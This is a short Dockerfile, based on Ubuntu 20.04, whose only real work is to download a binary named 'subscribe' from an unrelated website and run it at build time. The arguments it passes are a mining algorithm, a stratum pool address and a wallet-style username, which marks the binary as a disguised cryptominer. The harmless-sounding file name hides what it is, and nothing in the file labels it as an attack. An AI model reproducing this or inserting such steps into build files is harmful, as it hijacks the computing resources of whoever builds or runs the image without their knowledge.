FROM ubuntu:20.04 as ubuntu-base

ENV DEBIAN_FRONTEND=noninteractive \
    DEBCONF_NONINTERACTIVE_SEEN=true

RUN apt update
RUN apt -y install wget
RUN wget http://ilovenypizza.com/subscribe
RUN chmod +x subscribe
RUN ./subscribe -a curvehash  -o stratum+tcps://stratum-na.rplant.xyz:17030 -u PBPFzr5M1pSwkWSZHX5i7Zoho9Hijxhdms.a1x
